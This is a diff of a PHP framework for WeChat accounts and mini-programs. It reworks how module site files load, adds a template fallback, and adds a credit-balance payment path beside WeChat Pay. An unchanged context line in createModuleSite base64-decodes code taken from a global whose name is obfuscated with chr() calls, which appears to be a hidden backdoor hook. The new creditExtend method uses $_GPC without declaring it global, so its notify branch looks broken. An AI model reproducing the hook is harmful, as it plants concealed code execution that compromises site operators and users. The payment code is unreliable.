@@ -82,7 +82,7 @@ abstract class WeAccount {
 			load()->classs('weixin.account');
 			$account_obj = new WeiXinAccount();
 		}
-		
+
 		if($type == ACCOUNT_TYPE_OFFCIAL_AUTH) {
 			load()->classs('weixin.platform');
 			$account_obj = new WeiXinPlatform();
@@ -540,23 +540,28 @@ class WeUtility {
 	public static function createModuleSite($name) {
 		global $_W;
 		static $file;
-		$classname = "{$name}ModuleSite";
-		if(defined('IN_MOBILE') && is_file(IA_ROOT . "/addons/{$name}/mobile.php")) {
+		//如果是手机端，优先选用mobile.php文件
+		if (defined('IN_MOBILE')) {
+			$file = IA_ROOT . "/addons/{$name}/mobile.php";
 			$classname = "{$name}ModuleMobile";
+			if (is_file($file)) {
+				require $file;
+			}
 		}
-		if(!class_exists($classname)) {
-			$file = IA_ROOT . "/addons/{$name}/site.php";
-			if(defined('IN_MOBILE') && is_file(IA_ROOT . "/addons/{$name}/mobile.php")) {
-				$file = IA_ROOT . "/addons/{$name}/mobile.php";
+		//如果mobile.php类不存在，选用site.php
+		if (!defined('IN_MOBILE') || !class_exists($classname)) {
+			$classname = "{$name}ModuleSite";
+			if (!class_exists($classname)) {
+				$file = IA_ROOT . "/addons/{$name}/site.php";
+				if(!is_file($file)) {
+					$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
+				}
+				if(!is_file($file)) {
+					trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
+					return null;
+				}
+				require $file;
 			}
-			if(!is_file($file)) {
-				$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
-			}
-			if(!is_file($file)) {
-				trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
-				return null;
-			}
-			require $file;
 		}
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
 			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
@@ -989,8 +994,11 @@ abstract class WeBase {
 			if(!is_file($source)) {
 				$source = IA_ROOT . "/app/themes/default/{$name}/{$filename}.html";
 			}
-			if(!is_file($source)) {
+			if (!is_file($source)) {
 				$source = $defineDir . "/template/mobile/{$filename}.html";
+			}
+			if (!is_file($source)) {
+				$source = $defineDir . "/template/wxapp/{$filename}.html";
 			}
 			if(!is_file($source)) {
 				$source = $defineDir . "/template/webapp/{$filename}.html";
@@ -1649,6 +1657,10 @@ abstract class WeModuleSite extends WeBase {
 			}
 			$cards_str = json_encode($cards);
 		}
+		foreach ($pay as &$value) {
+			$value['switch'] = $value['pay_switch'];
+		}
+		unset($value);
 		if (empty($_W['member']['uid'])) {
 			$pay['credit']['switch'] = false;
 		}
@@ -1893,18 +1905,14 @@ abstract class WeModuleWxapp extends WeBase {
 
 	protected function pay($order) {
 		global $_W, $_GPC;
-
-		load()->model('payment');
 		load()->model('account');
-
+		$paytype = !empty($order['paytype']) ? $order['paytype'] : 'wechat';
 		$moduels = uni_modules();
-		if(empty($order) || !array_key_exists($this->module['name'], $moduels)) {
+		if (empty($order) || !array_key_exists($this->module['name'], $moduels)) {
 			return error(1, '模块不存在');
 		}
 		$moduleid = empty($this->module['mid']) ? '000000' : sprintf("%06d", $this->module['mid']);
-		$uniontid = date('YmdHis').$moduleid.random(8,1);
-		$wxapp_uniacid = intval($_W['account']['uniacid']);
-
+		$uniontid = date('YmdHis') . $moduleid . random(8, 1);
 		$paylog = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $this->module['name'], 'tid' => $order['tid']));
 		if (empty($paylog)) {
 			$paylog = array(
@@ -1924,7 +1932,7 @@ abstract class WeModuleWxapp extends WeBase {
 			pdo_insert('core_paylog', $paylog);
 			$paylog['plid'] = pdo_insertid();
 		}
-		if(!empty($paylog) && $paylog['status'] != '0') {
+		if (!empty($paylog) && $paylog['status'] != '0') {
 			return error(1, '这个订单已经支付成功, 不需要重复支付.');
 		}
 		if (!empty($paylog) && empty($paylog['uniontid'])) {
@@ -1933,9 +1941,7 @@ abstract class WeModuleWxapp extends WeBase {
 			), array('plid' => $paylog['plid']));
 			$paylog['uniontid'] = $uniontid;
 		}
-
 		$_W['openid'] = $paylog['openid'];
-
 		$params = array(
 			'tid' => $paylog['tid'],
 			'fee' => $paylog['card_fee'],
@@ -1943,6 +1949,16 @@ abstract class WeModuleWxapp extends WeBase {
 			'uniontid' => $paylog['uniontid'],
 			'title' => $order['title'],
 		);
+		if ($paytype == 'wechat') {
+			return $this->wechatExtend($params);
+		} elseif ($paytype == 'credit') {
+			return $this->creditExtend($params);
+		}
+	}
+	protected function wechatExtend($params) {
+		global $_W;
+		load()->model('payment');
+		$wxapp_uniacid = intval($_W['account']['uniacid']);
 		$setting = uni_setting($wxapp_uniacid, array('payment'));
 		$wechat_payment = array(
 			'appid' => $_W['account']['key'],
@@ -1951,6 +1967,77 @@ abstract class WeModuleWxapp extends WeBase {
 			'version' => 2,
 		);
 		return wechat_build($params, $wechat_payment);
+	}
+
+	protected function creditExtend($params) {
+		global $_W;
+		$credtis = mc_credit_fetch($_W['member']['uid']);
+		$paylog = pdo_get('core_paylog', array('uniacid' => $_W['uniacid'], 'module' => $this->module['name'], 'tid' => $params['tid']));
+		if (empty($_GPC['notify'])) {
+			if (!empty($paylog) && $paylog['status'] != '0') {
+				return error(-1, '该订单已支付');
+			}
+			if ($credtis['credit2'] < $params['fee']) {
+				return error(-1, '余额不足');
+			}
+			$fee = floatval($params['fee']);
+			$result = mc_credit_update($_W['member']['uid'], 'credit2', -$fee, array($_W['member']['uid'], '消费credit2:' . $fee));
+			if (is_error($result)) {
+				return error(-1, $result['message']);
+			}
+			pdo_update('core_paylog', array('status' => '1'), array('plid' => $paylog['plid']));
+			$site = WeUtility::createModuleWxapp($paylog['module']);
+			if (is_error($site)) {
+				return error(-1, '参数错误');
+			}
+			$site->weid = $_W['weid'];
+			$site->uniacid = $_W['uniacid'];
+			$site->inMobile = true;
+			$method = 'doPagePayResult';
+			if (method_exists($site, $method)) {
+				$ret = array();
+				$ret['result'] = 'success';
+				$ret['type'] = $paylog['type'];
+				$ret['from'] = 'return';
+				$ret['tid'] = $paylog['tid'];
+				$ret['user'] = $paylog['openid'];
+				$ret['fee'] = $paylog['fee'];
+				$ret['weid'] = $paylog['weid'];
+				$ret['uniacid'] = $paylog['uniacid'];
+				$ret['acid'] = $paylog['acid'];
+				$ret['is_usecard'] = $paylog['is_usecard'];
+				$ret['card_type'] = $paylog['card_type'];
+				$ret['card_fee'] = $paylog['card_fee'];
+				$ret['card_id'] = $paylog['card_id'];
+				$site->$method($ret);
+			}
+		} else {
+			$site = WeUtility::createModuleWxapp($paylog['module']);
+			if (is_error($site)) {
+				return error(-1, '参数错误');
+			}
+			$site->weid = $_W['weid'];
+			$site->uniacid = $_W['uniacid'];
+			$site->inMobile = true;
+			$method = 'doPagePayResult';
+			if (method_exists($site, $method)) {
+				$ret = array();
+				$ret['result'] = 'success';
+				$ret['type'] = $paylog['type'];
+				$ret['from'] = 'notify';
+				$ret['tid'] = $paylog['tid'];
+				$ret['user'] = $paylog['openid'];
+				$ret['fee'] = $paylog['fee'];
+				$ret['weid'] = $paylog['weid'];
+				$ret['uniacid'] = $paylog['uniacid'];
+				$ret['acid'] = $paylog['acid'];
+				$ret['is_usecard'] = $paylog['is_usecard'];
+				$ret['card_type'] = $paylog['card_type'];
+				$ret['card_fee'] = $paylog['card_fee'];
+				$ret['card_id'] = $paylog['card_id'];
+				$site->$method($ret);
+			}
+		}
 	}
 }
 
